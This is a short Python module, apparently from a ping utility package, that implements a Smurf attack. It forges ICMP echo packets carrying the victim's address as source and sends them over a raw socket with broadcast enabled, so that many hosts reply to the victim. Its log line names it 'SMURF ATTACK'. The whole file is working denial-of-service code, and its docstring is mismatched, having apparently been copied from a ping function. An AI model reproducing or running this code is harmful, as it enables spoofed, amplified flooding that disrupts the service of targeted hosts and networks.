import logging
import socket
from socket import AF_INET, SOCK_RAW, IPPROTO_IP, IPPROTO_ICMP

from myping.utils.ip import generate_ip_packet
from myping.utils.ping import generate_ping_ip_payload


LOG = logging.getLogger(__name__)


def generate_smurf_packet(source_ip, dest_ip, payload_size=56):
    payload = generate_ping_ip_payload(1, 1, payload_size)
    packet_data = generate_ip_packet(dest_ip, IPPROTO_ICMP, payload, source_addr=source_ip)
    return packet_data


def send_one_smurf(sock, source_ip, dest_ip, payload_size=56):
    packet_data = generate_smurf_packet(source_ip, dest_ip, payload_size)
    sock.sendto(packet_data, ('', 0))


def _smurf(source_ip, dest_ip, payload_size):
    with socket.socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as sock:
        sock.bind(('', 1))
        sock.setblocking(0)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        send_one_smurf(sock, source_ip, dest_ip, payload_size)


def smurf(target, broadcast_addr, count=4, payload_size=56):
    """Send `count` pings to `dest_addr` with the given `timeout` and display
    the result.
    """
    try:
        dest_addr = socket.gethostbyname(target)
        frame_size = payload_size + 28
        LOG.info('SMURF ATTACK {} ({}) {}({}) bytes of data via {}.'.format(
            target, dest_addr, payload_size, frame_size, broadcast_addr))
        for _ in range(count):
            _smurf(dest_addr, broadcast_addr, payload_size)
    except socket.gaierror as e:
        LOG.error(e)
    except PermissionError:
        LOG.error('Must be superuser')
